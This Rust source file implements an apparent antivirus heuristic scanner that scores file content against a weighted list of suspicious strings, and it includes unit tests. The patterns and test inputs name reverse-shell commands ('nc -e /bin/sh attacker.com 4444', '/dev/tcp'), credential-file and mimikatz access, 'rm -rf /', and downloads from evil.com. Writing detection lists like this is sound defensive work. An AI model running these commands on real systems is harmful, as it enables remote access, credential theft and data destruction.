//! Suspicious string scanner using Aho-Corasick multi-pattern search.
//!
//! Scans file content for known suspicious strings and API names associated
//! with malicious behavior. Each pattern is weighted by severity (1-10) and
//! categorized for reporting. The total weighted score indicates the overall
//! suspiciousness of the file's string content.

use aho_corasick::{AhoCorasick, AhoCorasickBuilder, MatchKind};
use guardian_common::{Detection, DetectionEngine, Severity};
use std::collections::HashMap;
use std::sync::LazyLock;

/// A suspicious pattern with its metadata.
#[derive(Debug, Clone)]
pub struct SuspiciousPattern {
    /// The string to search for (case-insensitive matching is done at build time).
    pub pattern: &'static str,
    /// Severity weight (1-10).
    pub weight: u32,
    /// Category for grouping related patterns.
    pub category: PatternCategory,
    /// Brief description of why this pattern is suspicious.
    pub description: &'static str,
}

/// Categories for suspicious patterns.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum PatternCategory {
    /// Windows API calls used for process injection and memory manipulation.
    WindowsApiAbuse,
    /// PowerShell-based attack techniques.
    PowerShell,
    /// Unix/Linux shell commands used in attacks.
    ShellCommand,
    /// Network download and data exfiltration.
    WebDownload,
    /// Cryptographic operations (can indicate ransomware).
    Crypto,
    /// Anti-analysis and anti-debugging techniques.
    AntiAnalysis,
    /// Credential theft and privilege escalation.
    CredentialAccess,
    /// Persistence mechanisms.
    Persistence,
    /// Generic suspicious indicators.
    Suspicious,
}

impl PatternCategory {
    /// Human-readable label for this category.
    pub fn label(&self) -> &'static str {
        match self {
            PatternCategory::WindowsApiAbuse => "Windows API Abuse",
            PatternCategory::PowerShell => "PowerShell",
            PatternCategory::ShellCommand => "Shell Command",
            PatternCategory::WebDownload => "Web/Download",
            PatternCategory::Crypto => "Cryptography",
            PatternCategory::AntiAnalysis => "Anti-Analysis",
            PatternCategory::CredentialAccess => "Credential Access",
            PatternCategory::Persistence => "Persistence",
            PatternCategory::Suspicious => "Suspicious",
        }
    }
}

/// Build the list of all suspicious patterns to scan for.
fn build_pattern_list() -> Vec<SuspiciousPattern> {
    vec![
        // === Windows API Abuse ===
        SuspiciousPattern {
            pattern: "CreateRemoteThread",
            weight: 8,
            category: PatternCategory::WindowsApiAbuse,
            description: "Remote thread injection into another process",
        },
        SuspiciousPattern {
            pattern: "VirtualAllocEx",
            weight: 8,
            category: PatternCategory::WindowsApiAbuse,
            description: "Allocate memory in a remote process",
        },
        SuspiciousPattern {
            pattern: "WriteProcessMemory",
            weight: 8,
            category: PatternCategory::WindowsApiAbuse,
            description: "Write to another process's memory space",
        },
        SuspiciousPattern {
            pattern: "NtUnmapViewOfSection",
            weight: 9,
            category: PatternCategory::WindowsApiAbuse,
            description: "Process hollowing technique",
        },
        SuspiciousPattern {
            pattern: "SetWindowsHookEx",
            weight: 6,
            category: PatternCategory::WindowsApiAbuse,
            description: "Install a hook procedure (keylogger potential)",
        },
        SuspiciousPattern {
            pattern: "OpenProcess",
            weight: 4,
            category: PatternCategory::WindowsApiAbuse,
            description: "Open handle to another process",
        },
        SuspiciousPattern {
            pattern: "QueueUserAPC",
            weight: 7,
            category: PatternCategory::WindowsApiAbuse,
            description: "APC injection technique",
        },
        SuspiciousPattern {
            pattern: "NtCreateThreadEx",
            weight: 8,
            category: PatternCategory::WindowsApiAbuse,
            description: "Low-level thread creation for injection",
        },

        // === PowerShell ===
        SuspiciousPattern {
            pattern: "Invoke-Expression",
            weight: 7,
            category: PatternCategory::PowerShell,
            description: "Dynamic code execution via PowerShell",
        },
        SuspiciousPattern {
            pattern: "-EncodedCommand",
            weight: 8,
            category: PatternCategory::PowerShell,
            description: "Base64-encoded PowerShell command execution",
        },
        SuspiciousPattern {
            pattern: "-nop -w hidden",
            weight: 9,
            category: PatternCategory::PowerShell,
            description: "Hidden PowerShell execution with no profile",
        },
        SuspiciousPattern {
            pattern: "IEX",
            weight: 5,
            category: PatternCategory::PowerShell,
            description: "Short alias for Invoke-Expression",
        },
        SuspiciousPattern {
            pattern: "DownloadString",
            weight: 7,
            category: PatternCategory::PowerShell,
            description: "Download and execute string from URL",
        },
        SuspiciousPattern {
            pattern: "New-Object Net.WebClient",
            weight: 6,
            category: PatternCategory::PowerShell,
            description: "Create web client for downloading content",
        },
        SuspiciousPattern {
            pattern: "Invoke-Mimikatz",
            weight: 10,
            category: PatternCategory::PowerShell,
            description: "PowerShell Mimikatz credential dumper",
        },

        // === Shell Commands ===
        SuspiciousPattern {
            pattern: "rm -rf /",
            weight: 10,
            category: PatternCategory::ShellCommand,
            description: "Destructive recursive deletion of root",
        },
        SuspiciousPattern {
            pattern: "chmod 777",
            weight: 5,
            category: PatternCategory::ShellCommand,
            description: "Set overly permissive file permissions",
        },
        SuspiciousPattern {
            pattern: "nc -e /bin/sh",
            weight: 9,
            category: PatternCategory::ShellCommand,
            description: "Netcat reverse shell",
        },
        SuspiciousPattern {
            pattern: "/dev/tcp",
            weight: 8,
            category: PatternCategory::ShellCommand,
            description: "Bash TCP device for reverse shell",
        },
        SuspiciousPattern {
            pattern: "bash -i",
            weight: 6,
            category: PatternCategory::ShellCommand,
            description: "Interactive bash shell (often in reverse shell)",
        },
        SuspiciousPattern {
            pattern: ">/dev/null 2>&1",
            weight: 3,
            category: PatternCategory::ShellCommand,
            description: "Suppress command output (stealth)",
        },
        SuspiciousPattern {
            pattern: "nohup",
            weight: 3,
            category: PatternCategory::ShellCommand,
            description: "Run process immune to hangups (persistence)",
        },

        // === Web/Download ===
        SuspiciousPattern {
            pattern: "URLDownloadToFile",
            weight: 7,
            category: PatternCategory::WebDownload,
            description: "Download file from URL via WinAPI",
        },
        SuspiciousPattern {
            pattern: "wget ",
            weight: 4,
            category: PatternCategory::WebDownload,
            description: "Command-line HTTP download utility",
        },
        SuspiciousPattern {
            pattern: "curl ",
            weight: 4,
            category: PatternCategory::WebDownload,
            description: "Command-line HTTP transfer utility",
        },
        SuspiciousPattern {
            pattern: "Invoke-WebRequest",
            weight: 6,
            category: PatternCategory::WebDownload,
            description: "PowerShell HTTP request cmdlet",
        },
        SuspiciousPattern {
            pattern: "InternetOpenUrl",
            weight: 5,
            category: PatternCategory::WebDownload,
            description: "WinINet URL open for downloading",
        },
        SuspiciousPattern {
            pattern: "HttpSendRequest",
            weight: 5,
            category: PatternCategory::WebDownload,
            description: "WinINet HTTP request for C2 comms",
        },

        // === Cryptography ===
        SuspiciousPattern {
            pattern: "CryptEncrypt",
            weight: 5,
            category: PatternCategory::Crypto,
            description: "Windows CryptoAPI encryption (ransomware indicator)",
        },
        SuspiciousPattern {
            pattern: "CryptDecrypt",
            weight: 4,
            category: PatternCategory::Crypto,
            description: "Windows CryptoAPI decryption",
        },
        SuspiciousPattern {
            pattern: "BCryptEncrypt",
            weight: 5,
            category: PatternCategory::Crypto,
            description: "Windows CNG encryption",
        },
        SuspiciousPattern {
            pattern: "CryptAcquireContext",
            weight: 4,
            category: PatternCategory::Crypto,
            description: "Acquire crypto provider handle",
        },
        SuspiciousPattern {
            pattern: ".onion",
            weight: 6,
            category: PatternCategory::Crypto,
            description: "Tor hidden service address (C2 or ransomware)",
        },
        SuspiciousPattern {
            pattern: "bitcoin:",
            weight: 5,
            category: PatternCategory::Crypto,
            description: "Bitcoin URI scheme (ransomware payment)",
        },

        // === Anti-Analysis ===
        SuspiciousPattern {
            pattern: "IsDebuggerPresent",
            weight: 6,
            category: PatternCategory::AntiAnalysis,
            description: "Check if process is being debugged",
        },
        SuspiciousPattern {
            pattern: "CheckRemoteDebuggerPresent",
            weight: 7,
            category: PatternCategory::AntiAnalysis,
            description: "Detect remote debugger attachment",
        },
        SuspiciousPattern {
            pattern: "NtQueryInformationProcess",
            weight: 6,
            category: PatternCategory::AntiAnalysis,
            description: "Query process info for anti-debug checks",
        },
        SuspiciousPattern {
            pattern: "OutputDebugString",
            weight: 3,
            category: PatternCategory::AntiAnalysis,
            description: "Anti-debug timing technique",
        },
        SuspiciousPattern {
            pattern: "SbieDll",
            weight: 5,
            category: PatternCategory::AntiAnalysis,
            description: "Sandboxie detection (sandbox evasion)",
        },
        SuspiciousPattern {
            pattern: "vmware",
            weight: 4,
            category: PatternCategory::AntiAnalysis,
            description: "VMware detection (VM evasion)",
        },

        // === Credential Access ===
        SuspiciousPattern {
            pattern: "/etc/shadow",
            weight: 8,
            category: PatternCategory::CredentialAccess,
            description: "Linux password shadow file access",
        },
        SuspiciousPattern {
            pattern: "SAM",
            weight: 5,
            category: PatternCategory::CredentialAccess,
            description: "Windows SAM database (local credentials)",
        },
        SuspiciousPattern {
            pattern: "lsass",
            weight: 7,
            category: PatternCategory::CredentialAccess,
            description: "LSASS process targeting (credential dump)",
        },
        SuspiciousPattern {
            pattern: "mimikatz",
            weight: 10,
            category: PatternCategory::CredentialAccess,
            description: "Mimikatz credential extraction tool",
        },
        SuspiciousPattern {
            pattern: "sekurlsa",
            weight: 9,
            category: PatternCategory::CredentialAccess,
            description: "Mimikatz sekurlsa module for credential dump",
        },
        SuspiciousPattern {
            pattern: "/etc/passwd",
            weight: 5,
            category: PatternCategory::CredentialAccess,
            description: "Linux user account file access",
        },

        // === Persistence ===
        SuspiciousPattern {
            pattern: "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            weight: 7,
            category: PatternCategory::Persistence,
            description: "Windows registry Run key persistence",
        },
        SuspiciousPattern {
            pattern: "schtasks /create",
            weight: 6,
            category: PatternCategory::Persistence,
            description: "Create scheduled task for persistence",
        },
        SuspiciousPattern {
            pattern: "crontab",
            weight: 4,
            category: PatternCategory::Persistence,
            description: "Linux cron job for persistence",
        },
    ]
}

/// Results from the string scanning phase.
#[derive(Debug, Clone)]
pub struct StringScanResult {
    /// Total weighted score from all matched patterns.
    pub total_score: u32,
    /// Individual match details: (pattern_index, count).
    pub matches: Vec<StringMatch>,
    /// Score breakdown by category.
    pub category_scores: HashMap<PatternCategory, u32>,
}

/// A single pattern match result.
#[derive(Debug, Clone)]
pub struct StringMatch {
    /// The pattern that matched.
    pub pattern: String,
    /// Number of times this pattern was found.
    pub count: usize,
    /// Weight of this pattern.
    pub weight: u32,
    /// Category of this pattern.
    pub category: PatternCategory,
    /// Description of the pattern.
    pub description: String,
}

/// Compiled string scanner using Aho-Corasick automaton.
pub struct StringScanner {
    /// The compiled Aho-Corasick automaton.
    automaton: AhoCorasick,
    /// Metadata for each pattern (indexed by pattern ID).
    patterns: Vec<SuspiciousPattern>,
}

/// Global pattern list, built once.
static PATTERNS: LazyLock<Vec<SuspiciousPattern>> = LazyLock::new(build_pattern_list);

impl StringScanner {
    /// Create a new scanner with the default pattern set.
    pub fn new() -> Self {
        Self::from_patterns(PATTERNS.clone())
    }

    /// Create a scanner from a custom pattern set.
    pub fn from_patterns(patterns: Vec<SuspiciousPattern>) -> Self {
        let pattern_strings: Vec<&str> = patterns.iter().map(|p| p.pattern).collect();

        let automaton = AhoCorasickBuilder::new()
            .ascii_case_insensitive(true)
            .match_kind(MatchKind::LeftmostFirst)
            .build(&pattern_strings)
            .expect("Failed to build Aho-Corasick automaton");

        Self {
            automaton,
            patterns,
        }
    }

    /// Scan data and return aggregated results.
    pub fn scan(&self, data: &[u8]) -> StringScanResult {
        let mut match_counts = vec![0usize; self.patterns.len()];

        for mat in self.automaton.find_iter(data) {
            match_counts[mat.pattern().as_usize()] += 1;
        }

        let mut total_score = 0u32;
        let mut matches = Vec::new();
        let mut category_scores: HashMap<PatternCategory, u32> = HashMap::new();

        for (idx, &count) in match_counts.iter().enumerate() {
            if count == 0 {
                continue;
            }

            let pattern = &self.patterns[idx];
            // Weight is per-occurrence, but we cap per-pattern contribution
            // to prevent a single repeated string from dominating the score.
            let pattern_score = (pattern.weight * count.min(5) as u32).min(pattern.weight * 3);
            total_score = total_score.saturating_add(pattern_score);

            *category_scores.entry(pattern.category).or_insert(0) += pattern_score;

            matches.push(StringMatch {
                pattern: pattern.pattern.to_string(),
                count,
                weight: pattern.weight,
                category: pattern.category,
                description: pattern.description.to_string(),
            });
        }

        StringScanResult {
            total_score,
            matches,
            category_scores,
        }
    }

    /// Convert scan results into Detection objects for the engine pipeline.
    pub fn to_detections(&self, result: &StringScanResult) -> Vec<Detection> {
        let mut detections = Vec::new();

        for m in &result.matches {
            let severity = match m.weight {
                8..=10 => Severity::High,
                5..=7 => Severity::Medium,
                _ => Severity::Low,
            };

            let mut metadata = HashMap::new();
            metadata.insert("category".to_string(), m.category.label().to_string());
            metadata.insert("count".to_string(), m.count.to_string());
            metadata.insert("weight".to_string(), m.weight.to_string());

            detections.push(Detection {
                engine: DetectionEngine::Heuristic,
                rule_name: format!("HEUR:String/{}", m.pattern),
                description: m.description.clone(),
                severity,
                metadata,
            });
        }

        detections
    }
}

impl Default for StringScanner {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pattern_list_count() {
        let patterns = build_pattern_list();
        assert!(
            patterns.len() >= 40,
            "Expected at least 40 patterns, got {}",
            patterns.len()
        );
    }

    #[test]
    fn test_scanner_creation() {
        let scanner = StringScanner::new();
        assert!(!scanner.patterns.is_empty());
    }

    #[test]
    fn test_scan_clean_data() {
        let scanner = StringScanner::new();
        let result = scanner.scan(b"This is a perfectly normal text file with no issues.");
        assert_eq!(result.total_score, 0);
        assert!(result.matches.is_empty());
    }

    #[test]
    fn test_scan_windows_api_abuse() {
        let scanner = StringScanner::new();
        let data = b"call CreateRemoteThread and VirtualAllocEx for injection";
        let result = scanner.scan(data);

        assert!(result.total_score > 0);
        assert_eq!(result.matches.len(), 2);

        let pattern_names: Vec<&str> = result.matches.iter().map(|m| m.pattern.as_str()).collect();
        assert!(pattern_names.contains(&"CreateRemoteThread"));
        assert!(pattern_names.contains(&"VirtualAllocEx"));
    }

    #[test]
    fn test_scan_case_insensitive() {
        let scanner = StringScanner::new();
        let data = b"CREATEREMOTETHREAD virtualAllocEx";
        let result = scanner.scan(data);
        assert_eq!(result.matches.len(), 2);
    }

    #[test]
    fn test_scan_powershell_patterns() {
        let scanner = StringScanner::new();
        let data = b"powershell -nop -w hidden -EncodedCommand AAAA Invoke-Expression IEX";
        let result = scanner.scan(data);

        assert!(result.total_score > 0);
        let categories: Vec<PatternCategory> =
            result.matches.iter().map(|m| m.category).collect();
        assert!(categories.contains(&PatternCategory::PowerShell));
    }

    #[test]
    fn test_scan_shell_commands() {
        let scanner = StringScanner::new();
        let data = b"#!/bin/bash\nnc -e /bin/sh attacker.com 4444\nbash -i >/dev/tcp/10.0.0.1/8080";
        let result = scanner.scan(data);

        assert!(result.total_score > 0);
        let has_shell = result
            .category_scores
            .contains_key(&PatternCategory::ShellCommand);
        assert!(has_shell, "Should detect shell command patterns");
    }

    #[test]
    fn test_scan_credential_access() {
        let scanner = StringScanner::new();
        let data = b"read /etc/shadow and run mimikatz sekurlsa::logonpasswords";
        let result = scanner.scan(data);

        assert!(result.total_score >= 20);
        let has_cred = result
            .category_scores
            .contains_key(&PatternCategory::CredentialAccess);
        assert!(has_cred);
    }

    #[test]
    fn test_scan_multiple_occurrences_capped() {
        let scanner = StringScanner::new();
        // Repeat mimikatz 20 times — score should be capped.
        let data = "mimikatz ".repeat(20);
        let result = scanner.scan(data.as_bytes());

        let mimikatz_match = result
            .matches
            .iter()
            .find(|m| m.pattern == "mimikatz")
            .expect("Should find mimikatz");

        assert_eq!(mimikatz_match.count, 20);
        // Weight=10, cap=min(count,5)*weight capped at weight*3=30
        // So total per-pattern should be <= 30
        let per_pattern_score = (10 * 20usize.min(5) as u32).min(10 * 3);
        assert_eq!(per_pattern_score, 30);
    }

    #[test]
    fn test_scan_anti_analysis() {
        let scanner = StringScanner::new();
        let data = b"IsDebuggerPresent CheckRemoteDebuggerPresent NtQueryInformationProcess";
        let result = scanner.scan(data);

        assert!(result.total_score > 0);
        assert!(result
            .category_scores
            .contains_key(&PatternCategory::AntiAnalysis));
    }

    #[test]
    fn test_scan_crypto_indicators() {
        let scanner = StringScanner::new();
        let data = b"CryptEncrypt CryptDecrypt .onion bitcoin:1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
        let result = scanner.scan(data);

        assert!(result.total_score > 0);
        assert!(result
            .category_scores
            .contains_key(&PatternCategory::Crypto));
    }

    #[test]
    fn test_to_detections() {
        let scanner = StringScanner::new();
        let data = b"CreateRemoteThread mimikatz";
        let result = scanner.scan(data);
        let detections = scanner.to_detections(&result);

        assert_eq!(detections.len(), 2);
        for d in &detections {
            assert_eq!(d.engine, DetectionEngine::Heuristic);
            assert!(d.rule_name.starts_with("HEUR:String/"));
        }
    }

    #[test]
    fn test_to_detections_severity_mapping() {
        let scanner = StringScanner::new();
        // mimikatz has weight=10 → High severity
        let data = b"mimikatz";
        let result = scanner.scan(data);
        let detections = scanner.to_detections(&result);

        assert_eq!(detections.len(), 1);
        assert_eq!(detections[0].severity, Severity::High);
    }

    #[test]
    fn test_custom_patterns() {
        let patterns = vec![SuspiciousPattern {
            pattern: "CUSTOM_BAD",
            weight: 7,
            category: PatternCategory::Suspicious,
            description: "Custom test pattern",
        }];
        let scanner = StringScanner::from_patterns(patterns);

        let result = scanner.scan(b"this contains CUSTOM_BAD string");
        assert_eq!(result.matches.len(), 1);
        assert_eq!(result.total_score, 7);
    }

    #[test]
    fn test_empty_data() {
        let scanner = StringScanner::new();
        let result = scanner.scan(b"");
        assert_eq!(result.total_score, 0);
        assert!(result.matches.is_empty());
    }

    #[test]
    fn test_web_download_patterns() {
        let scanner = StringScanner::new();
        let data = b"URLDownloadToFile wget http://evil.com curl http://malware.com Invoke-WebRequest";
        let result = scanner.scan(data);

        assert!(result.total_score > 0);
        assert!(result
            .category_scores
            .contains_key(&PatternCategory::WebDownload));
    }

    #[test]
    fn test_persistence_patterns() {
        let scanner = StringScanner::new();
        let data = b"reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run schtasks /create /tn evil";
        let result = scanner.scan(data);

        assert!(result.total_score > 0);
        assert!(result
            .category_scores
            .contains_key(&PatternCategory::Persistence));
    }
}
